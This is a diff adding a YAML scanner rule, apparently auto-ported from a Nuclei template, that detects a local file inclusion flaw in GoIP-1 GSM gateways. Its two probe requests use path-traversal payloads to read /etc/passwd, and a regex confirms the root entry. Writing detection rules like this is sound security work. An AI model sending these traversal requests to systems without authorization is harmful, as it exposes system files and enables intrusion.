@@ -1,0 +1,33 @@
+schema_version: 1
+id: "cortex.community:goip-1-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "GoIP-1 GSM - Local File Inclusion"
+  description: "GoIP-1 GSM is vulnerable to local file inclusion because input passed thru the 'content' or 'sidebar' GET parameter in 'frame.html' or 'frame.A100.html' is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://shufflingbytes.com/posts/hacking-goip-gsm-gateway/"
+    - "http://www.hybertone.com/uploadfile/download/20140304125509964.pdf"
+    - "http://en.dbltek.com/latestfirmwares.html"
+  cwes: [22]
+  tags: ["gsm", "goip", "lfi", "iot", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/default/en_US/frame.html?content=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" }
+  - id: "probe1"
+    request: { method: "GET", path: "/default/en_US/frame.A100.html?sidebar=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
+      - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:.*:0:0:" } }
